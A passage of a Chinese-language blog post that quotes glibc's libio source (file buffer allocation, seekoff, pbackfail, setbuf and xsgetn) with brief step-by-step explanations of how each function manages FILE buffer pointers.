class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure><ol><li>如果文件描述符大于等于0且文件返回的信息正常<ul><li>如果文件_IO_IS_FILEBUF标志被设置,设置 _IO_LINE_BUF标志位</li></ul></li><li>malloc申请chunk</li><li>设置buf指针并返回</li></ol><h2 id="seekpos"><a href="#seekpos" class="headerlink" title="seekpos"></a>seekpos</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_default_seekpos (FILE *fp, <span class="type">off64_t</span> pos, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _IO_SEEKOFF (fp, pos, <span class="number">0</span>, mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用_IO_SEEKOFF</p><h2 id="seekoff"><a href="#seekoff" class="headerlink" title="seekoff"></a>seekoff</h2><p>出现频率不高,暂时先略过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_new_file_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = (fp-&gt;_IO_read_base == fp-&gt;_IO_read_end</span><br><span class="line">       &amp;&amp; fp-&gt;_IO_write_base == fp-&gt;_IO_write_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush unwritten characters.</span></span><br><span class="line"><span class="comment">     (This may do an unneeded write if we seek within the buffer.</span></span><br><span class="line"><span class="comment">     But to be able to switch to reading, we would need to set</span></span><br><span class="line"><span class="comment">     egptr to pptr.  That can&#x27;t be done in the current design,</span></span><br><span class="line"><span class="comment">     which assumes file_ptr() is eGptr.  Anyway, since we probably</span></span><br><span class="line"><span class="comment">     end up flushing when we close(), it doesn&#x27;t make much difference.)</span></span><br><span class="line"><span class="comment">     <span class="doctag">FIXME:</span> simulate mem-mapped files. */</span></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_get_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* It could be that we already have a pushback buffer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_read_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (dir)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> _IO_seek_cur:</span><br><span class="line">      <span class="comment">/* Adjust for read-ahead (bytes is buffer). */</span></span><br><span class="line">      offset -= fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_offset == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">goto</span> dumb;</span><br><span class="line">      <span class="comment">/* Make offset absolute, assuming current pointer is file_ptr(). */</span></span><br><span class="line">      offset += fp-&gt;_offset;</span><br><span class="line">      <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __set_errno (EINVAL);</span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      dir = _IO_seek_set;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> _IO_seek_set:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> _IO_seek_end:</span><br><span class="line">      &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">if</span> (_IO_SYSSTAT (fp, &amp;st) == <span class="number">0</span> &amp;&amp; S_ISREG (st.st_mode))</span><br><span class="line">  &#123;</span><br><span class="line">    offset += st.st_size;</span><br><span class="line">    dir = _IO_seek_set;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">goto</span> dumb;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_free_backup_area (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* At this point, dir==_IO_seek_set. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If destination is within current buffer, optimize: */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD &amp;&amp; fp-&gt;_IO_read_base != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; !_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> start_offset = (fp-&gt;_offset</span><br><span class="line">                              - (fp-&gt;_IO_read_end - fp-&gt;_IO_buf_base));</span><br><span class="line">      <span class="keyword">if</span> (offset &gt;= start_offset &amp;&amp; offset &lt; fp-&gt;_offset)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">    fp-&gt;_IO_buf_base + (offset - start_offset),</span><br><span class="line">    fp-&gt;_IO_read_end);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  _IO_mask_flags (fp, <span class="number">0</span>, _IO_EOF_SEEN);</span><br><span class="line">  <span class="keyword">goto</span> resync;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    <span class="keyword">goto</span> dumb;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to seek to a block boundary, to improve kernel page management. */</span></span><br><span class="line">  new_offset = offset &amp; ~(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base - <span class="number">1</span>);</span><br><span class="line">  delta = offset - new_offset;</span><br><span class="line">  <span class="keyword">if</span> (delta &gt; fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      new_offset = offset;</span><br><span class="line">      delta = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  result = _IO_SYSSEEK (fp, new_offset, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (result &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (delta == <span class="number">0</span>)</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">   (must_be_exact</span><br><span class="line">    ? delta : fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base));</span><br><span class="line">      <span class="keyword">if</span> (count &lt; delta)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We weren&#x27;t allowed to read, but try to seek the remainder. */</span></span><br><span class="line">  offset = count == EOF ? delta : delta-count;</span><br><span class="line">  dir = _IO_seek_cur;</span><br><span class="line">  <span class="keyword">goto</span> dumb;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base + delta,</span><br><span class="line">    fp-&gt;_IO_buf_base + count);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_offset = result + count;</span><br><span class="line">  _IO_mask_flags (fp, <span class="number">0</span>, _IO_EOF_SEEN);</span><br><span class="line">  <span class="keyword">return</span> offset;</span><br><span class="line"> dumb:</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line">  result = _IO_SYSSEEK (fp, offset, dir);</span><br><span class="line">  <span class="keyword">if</span> (result != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_mask_flags (fp, <span class="number">0</span>, _IO_EOF_SEEN);</span><br><span class="line">      fp-&gt;_offset = result;</span><br><span class="line">      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">resync:</span><br><span class="line">  <span class="comment">/* We need to do it since it is possible that the file offset in</span></span><br><span class="line"><span class="comment">     the kernel may be changed behind our back. It may happen when</span></span><br><span class="line"><span class="comment">     we fopen a file and then do a fork. One process may access the</span></span><br><span class="line"><span class="comment">     file and the kernel file offset will be changed. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    _IO_SYSSEEK (fp, fp-&gt;_offset, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> offset;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_seekoff, _IO_file_seekoff)</span><br></pre></td></tr></table></figure><h2 id="pbackfail"><a href="#pbackfail" class="headerlink" title="pbackfail"></a>pbackfail</h2><p>出现频率不高,暂时先略过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_pbackfail (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt; fp-&gt;_IO_read_base &amp;&amp; !_IO_in_backup (fp)</span><br><span class="line">      &amp;&amp; (<span class="type">unsigned</span> <span class="type">char</span>) fp-&gt;_IO_read_ptr[<span class="number">-1</span>] == c)</span><br><span class="line">    --fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/</span></span><br><span class="line">      <span class="keyword">if</span> (!_IO_in_backup (fp))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We need to keep the invariant that the main get area</span></span><br><span class="line"><span class="comment">     logically follows the backup area.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt; fp-&gt;_IO_read_base &amp;&amp; _IO_have_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_ptr))</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!_IO_have_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* No backup buffer: allocate one. */</span></span><br><span class="line">      <span class="comment">/* Use nshort buffer, if unused? (probably not)  FIXME */</span></span><br><span class="line">      <span class="type">int</span> backup_size = <span class="number">128</span>;</span><br><span class="line">      <span class="type">char</span> *bbuf = (<span class="type">char</span> *) <span class="built_in">malloc</span> (backup_size);</span><br><span class="line">      <span class="keyword">if</span> (bbuf == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      fp-&gt;_IO_save_base = bbuf;</span><br><span class="line">      fp-&gt;_IO_save_end = fp-&gt;_IO_save_base + backup_size;</span><br><span class="line">      fp-&gt;_IO_backup_base = fp-&gt;_IO_save_end;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_switch_to_backup_area (fp);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt;= fp-&gt;_IO_read_base)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Increase size of existing backup buffer. */</span></span><br><span class="line">  <span class="type">size_t</span> new_size;</span><br><span class="line">  <span class="type">size_t</span> old_size = fp-&gt;_IO_read_end - fp-&gt;_IO_read_base;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  new_size = <span class="number">2</span> * old_size;</span><br><span class="line">  new_buf = (<span class="type">char</span> *) <span class="built_in">malloc</span> (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="built_in">memcpy</span> (new_buf + (new_size - old_size), fp-&gt;_IO_read_base,</span><br><span class="line">  old_size);</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_read_base);</span><br><span class="line">  _IO_setg (fp, new_buf, new_buf + (new_size - old_size),</span><br><span class="line">    new_buf + new_size);</span><br><span class="line">  fp-&gt;_IO_backup_base = fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      *--fp-&gt;_IO_read_ptr = c;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_pbackfail)</span><br></pre></td></tr></table></figure><h2 id="setbuf"><a href="#setbuf" class="headerlink" title="setbuf"></a>setbuf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_default_setbuf (fp, p, len) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_setbuf, _IO_file_setbuf)</span><br></pre></td></tr></table></figure><ol><li>调用_IO_default_setbuf (fp, p, len)</li><li>调整pptr和gptr为_IO_buf_base</li></ol><p>看_IO_default_setbuf (fp, p, len)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_default_setbuf (FILE *fp, <span class="type">char</span> *p, <span class="type">ssize_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_IO_SYNC (fp) == EOF)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span> || len == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">fp-&gt;_flags |= _IO_UNBUFFERED;</span><br><span class="line">_IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">fp-&gt;_flags &amp;= ~_IO_UNBUFFERED;</span><br><span class="line">_IO_setb (fp, p, p+len, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>sync平衡失败直接返回NULL</li><li>缓冲区未指定或长度为0,将文件流设置为无缓冲模式,并设置缓冲区指针为shorbuf</li><li>否则取消无缓冲标志并设置缓冲区为指定区域</li><li>更新pptr和gptr为null</li><li>返回fp</li></ol><h2 id="xsgetn"><a href="#xsgetn" class="headerlink" title="xsgetn"></a>xsgetn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">     the user buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      